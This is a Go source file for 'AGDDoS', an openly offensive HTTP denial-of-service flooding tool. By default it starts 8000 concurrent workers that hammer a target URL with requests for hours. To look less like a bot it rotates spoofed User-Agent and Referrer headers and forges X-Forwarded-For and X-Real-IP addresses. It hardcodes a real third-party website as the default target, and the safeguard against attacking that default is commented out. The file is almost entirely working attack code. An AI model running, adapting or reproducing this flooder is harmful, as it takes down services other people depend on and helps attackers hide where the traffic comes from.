package main

import (
	"context"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"runtime"
	"strings"
	"time"
)

var (
	Method              string
	TargetUrl           string
	IntervalMillisecond int
	ConcurrencyCount    int
	DurationMinute      int

	//TODO：Socks5 Proxy
	DDosHttpClient = &http.Client{
		Transport: &http.Transport{
			DialContext: func(ctx context.Context, network, addr string) (conn net.Conn, e error) {
				dialer := net.Dialer{
					Timeout:   10 * time.Second, // 超时时间
					KeepAlive: 60 * time.Second, // KeepAlive时间
				}
				return dialer.Dial(network, addr)
			},
		},
	}
	UserAgents = []string{
		"Baiduspider-image+(+http://www.baidu.com/search/spider.htm)",
		"Baiduspider-render/2.0; (+http://www.baidu.com/search/spider.html)",
		"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto/2.8.131 Version/11.11",
		"Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11",
		"Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; The World)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Maxthon 2.0)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)",
		"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
		"Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920)",
		"Mozilla/5.0 (compatible; Googlebot-Image/1.0; +http://www.google.com/bot.html)",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
	}

	Refs = []string{
		"https://www.google.com/search?q=",
		"https://check-host.net/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.ip138.com/",
		"https://www.bing.com/search?q=",
		"https://r.search.yahoo.com/",
		"https://www.china.gov/index.html",
		"https://vk.com/profile.php?redirect=",
		"https://blog.csdn.net/",
		"https://help.baidu.com/searchResult?keywords=",
		"https://steamcommunity.com/market/search?q=",
		"https://wx.zsxq.com/",
		"https://www.android-ide.com/tutorial_androidapp.html",
		"https://www.baidu.com/s?ie=utf-8&wd=AGDDoS%2FAGDDoS",
		"https://www.baidu.com/s?ie=utf-8&wd=github.com%2FAGDDoS%2FAGDDoS",
		// Don't forget to add ourselves!
		"https://github.com/AGDDoS/AGDDoS",
	}
)

// Main Function
func main() {
	printWelcome()
	defaultTargetUrl := "https://kzkt.tianyuyun.com/static/h5_new_4.6.5.115/index.html"

	flag.StringVar(&Method, "m", "GET", "DDoS Method(GET/POST/HEAD/...)")
	flag.StringVar(&TargetUrl, "u", defaultTargetUrl, "Taget URL")
	flag.IntVar(&ConcurrencyCount, "cc", 8000, "并发线程数量")
	flag.IntVar(&IntervalMillisecond, "ims", 100, "每个线程执行攻击的频率(ms)")
	flag.IntVar(&DurationMinute, "dm", 2000, "Attack Duration time(Minutes)")
	flag.Parse()

	/*if TargetUrl == defaultTargetUrl {
		fmt.Printf("TargetUrl is %s, 请尝试通过命令行重传参数启动(TargetUrl 不能等于 defaultTargetUrl). Usage：./AGDDoS -h\n", TargetUrl)
		return
	}
	*/
	go func() {
		for i := 0; i < ConcurrencyCount; i++ {
			go DoAttacking(i)
		}
	}()
	time.Sleep(time.Duration(DurationMinute) * time.Minute)
}

func DoAttacking(grindex int) {
	for i := 0; ; i++ {
		if result, err := DoHttpRequest(); err != nil {
			PrintError(grindex, i, err.Error()) // Red. Client ERROR
			runtime.GC()                        // Clean up memory to prevent memory overflow
		} else {
			responseStatus := fmt.Sprintf("\033[1;32;40m (%s)", *result)                // Green. Status code is 200
			if !strings.Contains(*result, "200") && !strings.Contains(*result, "301") { // Status code is not 200/301
				responseStatus = fmt.Sprintf("\033[1;35;40m (%s)", *result) // Purple. Status code is 400/402/403/404/500/501/502/...
			}
			Log(grindex, i, responseStatus)
		}
		time.Sleep(time.Duration(IntervalMillisecond) * time.Millisecond)
		runtime.GC() // Clean up memory to prevent memory overflow
	}
}

func DoHttpRequest() (*string, error) {
	request, err := http.NewRequest(Method, TargetUrl, nil)
	if err != nil {
		return nil, err
	}
	// Make yourself don't look like a robot
	request.Header.Set("User-Agent", UserAgents[rand.Intn(len(UserAgents))])                        // 生成伪UA
	request.Header.Set("Referrer", Refs[rand.Intn(len(Refs))])                                      // 生成伪来源页面的地址
	request.Header.Set("Accept", "*/*")                                                             // 接受所有
	request.Header.Set("Accept-encoding", "gzip, deflate, br")                                      // 声明浏览器支持的编码类型
	request.Header.Set("Accept-language", "zh-CN,zh;q=0.9")                                         // 接受网页语言
	request.Header.Set("X-Forward-For", "186.240.156.78,1.4.0.1,1.5.127.254,1.5.26.6,"+genIpaddr()) // 多 层 代 理
	request.Header.Set("X-Real-IP", "186.240.156.78")                                               // 多 层 代 理
	request.Header.Set("DDoS-Powered-By", "AGDDoS")                                                 // 低 调 的 调 戏

	response, err := DDosHttpClient.Do(request)
	if err != nil {
		return nil, err
	}
	defer response.Body.Close()
	// Ignore and read the responseBody
	_, _ = ioutil.ReadAll(response.Body)
	runtime.GC() // Clean up memory to prevent memory overflow
	return &response.Status, err
}

// This is used to generate random IP addresses
func genIpaddr() string {
	rand.Seed(time.Now().Unix())
	ip := fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255))
	return ip
}

func printWelcome() {
	fmt.Println("+----------------------------------------------------------------+")
	fmt.Println("| Welcome to use AGDDOS.                                         |")
	fmt.Println("| Code by AGDDoS Team                                            |")
	fmt.Println("| If you have some problem when you use the tool,                |")
	fmt.Println("| please submit issue at : https://github.com/AGDDoS/AGDDoS      |")
	fmt.Println("+----------------------------------------------------------------+")
	fmt.Println()
	// sleep one second because the fmt is not thread-safety.
	// if not to do this, fmt.Print will print after the log.Print.
	time.Sleep(time.Second)
}

func Log(grindex int, i int, responseStatus string) {
	fmt.Printf("[INFO][AGDDoS#%d/%d]%s \033[0m \n", grindex, i, responseStatus) // 默认 [INFO][AGDDoS#当前线程序号/第i次重复] (Get "https://1.1.1.1": dial tcp 1.1.1.1:443: i/o timeout)
}

func PrintError(grindex int, i int, responseStatus string) {
	fmt.Printf("[Error][AGDDoS#%d/%d] \033[1;31;40m (%s) \033[0m \n", grindex, i, responseStatus) // 默认
}
